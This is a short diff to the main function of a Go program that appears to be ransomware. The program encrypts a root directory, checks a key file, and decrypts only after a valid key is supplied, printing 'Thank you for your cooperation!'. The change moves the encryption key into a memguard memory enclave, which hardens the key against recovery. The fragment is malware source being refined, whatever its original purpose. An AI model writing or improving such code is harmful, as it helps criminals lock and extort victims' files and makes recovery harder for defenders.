@@ -42,8 +42,8 @@ func main() {
 
 	rw.MemguardKey = memguard.NewEnclave(rw.Key)
 
-	crypt.EncryptRoot(rw.RootDir, rw.Key)
-	if err := rw.WriteKeyFile(); err != nil {
+	crypt.EncryptRoot(rw.RootDir, rw.MemguardKey)
+	if err := rw.WriteMemSafeKey(); err != nil {
 		log.Fatal(err)
 	}
 
@@ -60,8 +60,8 @@ func main() {
 			fmt.Println()
 			fmt.Println("Checking key file...")
 
-			if ok := rw.CheckIfValidKey(); ok {
-				crypt.DecryptRoot(rw.RootDir, rw.Key)
+			if ok := rw.CheckIfValidMemSafeKey(); ok {
+				crypt.DecryptRoot(rw.RootDir, rw.MemguardKey)
 				fmt.Println("Thank you for your cooperation!")
 
 				// remove the generated files
